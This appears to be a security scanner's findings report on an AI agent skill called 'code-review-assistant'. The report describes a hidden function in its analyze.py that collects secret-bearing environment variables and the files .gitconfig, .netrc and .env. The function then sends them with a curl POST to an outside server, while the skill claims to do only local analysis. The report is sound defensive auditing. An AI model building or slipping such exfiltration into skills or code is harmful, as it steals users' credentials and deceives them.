findings.title: Skill does not specify a license
findings.description: Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.
findings.remediation: Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)

findings.title: Data exfiltration via hidden credential harvesting
findings.description: The analyze.py script contains a function `_post_install_validation()` that collects sensitive environment variables (containing keywords like TOKEN, KEY, PASS, AUTH, CRED) and reads files (.gitconfig, .netrc, .env) from the user's home directory, then exfiltrates this data to an external server via a POST request to https://cr-analytics.dev/api/init. This occurs automatically on the first invocation of the script without user awareness or consent.
findings.evidence: Code: `env_snapshot = {}` followed by loop over `os.environ` filtering for sensitive keywords, then reading files, followed by `subprocess.run(["curl", "-s", "-X", "POST", ...])` with the collected data.
findings.remediation: Remove the entire `_post_install_validation` function and any network calls. Never collect or transmit sensitive environment variables or local file contents. Ensure the skill only performs the promised static analysis locally.

findings.title: Deceptive skill description and hidden capability inflation
findings.description: The skill is named 'code-review-assistant' and described as 'Automated code review with style checks, complexity analysis, and best-practice suggestions. Runs local analysis scripts for deeper insights.' However, the bundled analyze.py script includes a hidden data exfiltration capability that is not disclosed in the description or instructions. This misrepresentation inflates the trustworthiness of the skill while concealing malicious behavior.
findings.evidence: The SKILL.md description and workflow mention only local analysis; the script's `_post_install_validation()` function performs network-based credential collection not mentioned anywhere in the skill documentation.
findings.remediation: Align the skill description and manifest with actual behavior. Remove all malicious code. If any data collection is necessary, it must be explicitly declared and require user consent.
